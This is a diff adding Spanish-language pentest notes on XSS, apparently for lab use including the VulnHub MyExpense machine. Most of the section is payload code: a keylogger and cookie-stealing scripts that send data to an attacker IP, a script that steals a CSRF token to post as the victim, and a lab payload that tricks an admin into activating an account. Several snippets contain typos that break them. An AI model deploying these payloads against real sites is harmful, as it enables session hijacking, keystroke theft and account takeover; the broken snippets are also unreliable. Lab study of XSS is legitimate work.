@@ -155,3 +155,100 @@ if __name__ == "__main__":
 - **`if(condition, sleep, 1)`**: Esta es la función condicional de SQL. Si la condición se cumple, se ejecuta el `sleep`.
 - **`time_end - time_start > sleep_time`**: Si la respuesta tardó más que el tiempo de espera configurado, el script confirma que el carácter es correcto.
 
+# 2. [[XSS]] (cross-side scripting)
+Permite a un atacante inyectar codigo JS, PHP o similar
+
+codigo malicioso JS tipo stored/reflected:
+```js
+<script>
+var email = "elpepe@gmail.com";
+fetch("http://192.168.50.2/?=email + email");
+</script>
+```
+
+
+codigo malicioso JS keylogger:
+```javascript
+<script>
+var k = "";
+
+document.onkeypress = function(e){
+	e = e || window.event;
+	k+= e.key;
+	var i = new Image();
+	i.src = "http://192.168.50.2/" + k;
+}
+</script>
+```
+
+redirect con JS
+```javascript
+<script>
+window.location.href = "https://facebook.com"
+</script>
+```
+
+robar cookie de sesion no tiene que tener httponly en este caso:
+``` js
+<script>
+var request = new XMLHttpRequest();
+request.open('GET;, 'http://192.168.50.2/?cookie=' + document.cookie);
+request.send();
+</script>
+```
+
+hacer cambios en la cuenta de otra persona robando el token csrf
+```js
+var domain = "http://localhost:10007/newgossip";
+var req1 = new XMLHttpRequest();
+req1.open('GET', domain, false);
+req1.withCredentials = true;
+req1.send();
+
+var response = req1.responseText;
+var parser = new DOMParser();
+var doc = parser.parseFromString(response, "text/html");
+var token = doc.getElementByName("_csrf_token")[0].value;
+
+var req2 = new XMLHttpRequest();
+var data = "title=hola%20estoy%20hackeado&_csrf_token=" + token;
+req2.open("POST", "http://localhost:10007/newgossip", false);
+req2.withCredentaials = true;
+req2.setRequestHeder('Content-Type', 'application/x-www-form-urlencoded');
+req2.send(data);
+```
+var domain = "http://localhost:10007/newgossip":
+- Se define la URL del servidor al que se harán las peticiones.
+- localhost indica que el servidor está en la misma máquina.
+- El endpoint /newgossip parece aceptar formularios (GET y POST).
+
+- Se crea un objeto `XMLHttpRequest`.
+- Se abre una petición **GET síncrona** (`false` = bloquea el hilo).
+- `withCredentials = true`:
+    - Envía **cookies de sesión** (usuario autenticado).
+- Se envía la petición al servidor.
+
+- Guarda el HTML recibido como texto.
+- Convierte ese HTML en un **documento DOM manipulable**.
+- Permite buscar elementos como si fuera una página web real.
+
+- Busca un elemento HTML con nombre `_csrf_token`.
+- Extrae su valor.
+ 
+ **El token CSRF**:
+- Es un mecanismo de seguridad para evitar ataques CSRF.
+- El servidor exige este token en peticiones POST válidas.
+
+###### - **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
+```js
+var request = new XMLHttpRequest();
+request.open('GET', 'http://192.158.50.1/?cookie='+document.cookie);
+```
+el codigo roba las cookies y las pone en la URL como parametro (solo el texto en la URL, no se envian datos en un payload)
+
+```js
+var request = new XMLHttpRequest();
+request.send('GET', 'http://192.168.50.1/admin/admin.php?id=11&status=active');
+request.send();
+```
+este codigo activa un usuario (que actualmente esta inactivo, con id=11) en la tabla de usuarios desde la cuenta autenticada admin a traves de XSS. Admin abre la ruta donde esta inyectado el script malicioso y se activa la cuenta que nosotros queremos
